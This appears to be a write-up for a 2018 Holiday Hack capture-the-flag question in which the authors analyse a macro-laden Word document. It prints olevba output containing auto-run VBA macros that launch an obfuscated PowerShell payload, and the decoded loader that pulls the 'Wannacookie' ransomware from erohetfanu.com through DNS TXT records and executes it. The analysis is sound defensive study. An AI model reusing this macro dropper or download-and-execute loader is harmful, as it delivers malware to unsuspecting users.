Question 10: Identify the Domain
================================

| After completing the prior question, Alabaster gives you a document he suspects downloads the malware. What is the domain name the malware in the document downloads from?

Answer: *erohetfanu.com*

Solution
--------
.. note::
 The document from Alabaster can be downloaded using: https://www.holidayhackchallenge.com/2018/challenges/CHOCOLATE_CHIP_COOKIE_RECIPE.zip
 The password for the archive is ``elves``


Step 1: Analyse the document
^^^^^^^^^^^^^^^^^^^^^^^^^^^^
The environment we used to analyse the document was a virtual machine with the Kali Linux 2018.4 operating system. 

.. note::

  **Kali Linux 2018.4** had an issue unarchiving the document from the ZIP file using the **unzip** application. In turn, the **olevba** application also couldn't analyse the document while it was still within the zip archive. We solved this issue by extracting the ``CHOCOLATE_CHIP_COOKIE_RECIPE.docm`` file from the zip archive using the **7z** application and analysing the document outside of the archive.

We used the following command to analyse the document: ``olevba CHOCOLATE_CHIP_COOKIE_RECIPE.docm``.

.. note::

 **olevba** is a python script to parse OLE and OpenXML files such as MS Office documents (e.g. Word, Excel), to detect VBA Macros, extract their source code in clear text, decode malware obfuscation (Hex/Base64/StrReverse/Dridex) and detect security-related patterns such as auto-executable macros, suspicious VBA keywords used by malware, and potential IOCs (IP addresses, URLs, executable filenames, etc).

Our output from olevba consisted of the following:

.. code-block:: none
 :emphasize-lines: 19, 29

 olevba 0.53.1 - http://decalage.info/python/oletools
 Flags        Filename                                                         
 -----------  -----------------------------------------------------------------
 OpX:MASI---- CHOCOLATE_CHIP_COOKIE_RECIPE.docm
 ===============================================================================
 FILE: CHOCOLATE_CHIP_COOKIE_RECIPE.docm
 Type: OpenXML
 -------------------------------------------------------------------------------
 VBA MACRO ThisDocument.cls 
 in file: word/vbaProject.bin - OLE stream: u'VBA/ThisDocument'
 - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
 (empty macro)
 -------------------------------------------------------------------------------
 VBA MACRO Module1.bas 
 in file: word/vbaProject.bin - OLE stream: u'VBA/Module1'
 - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
 Private Sub Document_Open()
 Dim cmd As String
 cmd = "powershell.exe -NoE -Nop -NonI -ExecutionPolicy Bypass -C ""sal a New-Object; iex(a IO.StreamReader((a IO.Compression.DeflateStream([IO.MemoryStream][Convert]::FromBase64String('lVHRSsMwFP2VSwksYUtoWkxxY4iyir4oaB+EMUYoqQ1syUjToXT7d2/1Zb4pF5JDzuGce2+a3tXRegcP2S0lmsFA/AKIBt4ddjbChArBJnCCGxiAbOEMiBsfSl23MKzrVocNXdfeHU2Im/k8euuiVJRsZ1Ixdr5UEw9LwGOKRucFBBP74PABMWmQSopCSVViSZWre6w7da2uslKt8C6zskiLPJcJyttRjgC9zehNiQXrIBXispnKP7qYZ5S+mM7vjoavXPek9wb4qwmoARN8a2KjXS9qvwf+TSakEb+JBHj1eTBQvVVMdDFY997NQKaMSzZurIXpEv4bYsWfcnA51nxQQvGDxrlP8NxH/kMy9gXREohG'),[IO.Compression.CompressionMode]::Decompress)),[Text.Encoding]::ASCII)).ReadToEnd()"" "
 Shell cmd
 End Sub

 -------------------------------------------------------------------------------
 VBA MACRO NewMacros.bas 
 in file: word/vbaProject.bin - OLE stream: u'VBA/NewMacros'
 - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
 Sub AutoOpen()
 Dim cmd As String
 cmd = "powershell.exe -NoE -Nop -NonI -ExecutionPolicy Bypass -C ""sal a New-Object; iex(a IO.StreamReader((a IO.Compression.DeflateStream([IO.MemoryStream][Convert]::FromBase64String('lVHRSsMwFP2VSwksYUtoWkxxY4iyir4oaB+EMUYoqQ1syUjToXT7d2/1Zb4pF5JDzuGce2+a3tXRegcP2S0lmsFA/AKIBt4ddjbChArBJnCCGxiAbOEMiBsfSl23MKzrVocNXdfeHU2Im/k8euuiVJRsZ1Ixdr5UEw9LwGOKRucFBBP74PABMWmQSopCSVViSZWre6w7da2uslKt8C6zskiLPJcJyttRjgC9zehNiQXrIBXispnKP7qYZ5S+mM7vjoavXPek9wb4qwmoARN8a2KjXS9qvwf+TSakEb+JBHj1eTBQvVVMdDFY997NQKaMSzZurIXpEv4bYsWfcnA51nxQQvGDxrlP8NxH/kMy9gXREohG'),[IO.Compression.CompressionMode]::Decompress)),[Text.Encoding]::ASCII)).ReadToEnd()"" "
 Shell cmd
 End Sub

 +------------+-----------------+-----------------------------------------+
 | Type       | Keyword         | Description                             |
 +------------+-----------------+-----------------------------------------+
 | AutoExec   | AutoOpen        | Runs when the Word document is opened   |
 | AutoExec   | Document_Open   | Runs when the Word or Publisher         |
 |            |                 | document is opened                      |
 | Suspicious | Shell           | May run an executable file or a system  |
 |            |                 | command                                 |
 | Suspicious | powershell      | May run PowerShell commands             |
 | Suspicious | ExecutionPolicy | May run PowerShell commands             |
 | Suspicious | New-Object      | May create an OLE object using          |
 |            |                 | PowerShell                              |
 | IOC        | powershell.exe  | Executable file name                    |
 +------------+-----------------+-----------------------------------------+

The two emphasised lines in the code block shown above were identical. An examination of this PowerShell code revealed that it decoded (base64) then uncompressed the encoded string to create some new code. This new code was then executed. Our aim was to analyse this new code without executing it. We modified the code returned by olevba so that it stored the decoded/uncompressed string in a file called ``WannacookieLoader.ps1`` without executing the new code. The code we created to do this is shown below:

.. code-block:: powershell

 powershell.exe -ExecutionPolicy Bypass -C "sal a New-Object; (a IO.StreamReader((a IO.Compression.DeflateStream([IO.MemoryStream][Convert]::FromBase64String('lVHRSsMwFP2VSwksYUtoWkxxY4iyir4oaB+EMUYoqQ1syUjToXT7d2/1Zb4pF5JDzuGce2+a3tXRegcP2S0lmsFA/AKIBt4ddjbChArBJnCCGxiAbOEMiBsfSl23MKzrVocNXdfeHU2Im/k8euuiVJRsZ1Ixdr5UEw9LwGOKRucFBBP74PABMWmQSopCSVViSZWre6w7da2uslKt8C6zskiLPJcJyttRjgC9zehNiQXrIBXispnKP7qYZ5S+mM7vjoavXPek9wb4qwmoARN8a2KjXS9qvwf+TSakEb+JBHj1eTBQvVVMdDFY997NQKaMSzZurIXpEv4bYsWfcnA51nxQQvGDxrlP8NxH/kMy9gXREohG'),[IO.Compression.CompressionMode]::Decompress)),[Text.Encoding]::ASCII)).ReadToEnd() | Out-File E:\Temp\WannacookieLoader.ps1"

We ran the above code using Windows PowerShell ISE in a Windows 10 virtual machine. The following code snippet shows the contents of the output (``WannacookieLoader.ps1``) after some modifications for better readability:

.. code-block:: powershell
 :linenos:

  function H2A($a) {
    $o; $a -split '(..)' | ? { $_ }  | forEach {[char]([convert]::toint16($_,16))} | forEach {$o = $o + $_}
    return $o
  }
  $f = "77616E6E61636F6F6B69652E6D696E2E707331"
  $h = ""
  foreach ($i in 0..([convert]::ToInt32((Resolve-DnsName -Server erohetfanu.com -Name "$f.erohetfanu.com" -Type TXT).strings, 10)-1)) {
    $h += (Resolve-DnsName -Server erohetfanu.com -Name "$i.$f.erohetfanu.com" -Type TXT).strings
  }
  iex($(H2A $h | Out-string))

We performed a HEX -> ASCII translation on the string in line 5 to create the following table:

============ ======================================
Item              Value
============ ======================================
Decoded text wannacookie.min.ps1
string       77616E6E61636F6F6B69652E6D696E2E707331
============ ======================================

Examining ``WannacookieLoader.ps1`` showed that its purpose was to download the Wannacookie malware (``wannacookie.min.ps1``) via a clever use of DNS TXT records.

The above script also provided us with the domain name from which the malware was downloaded from: ``erohetfanu.com``

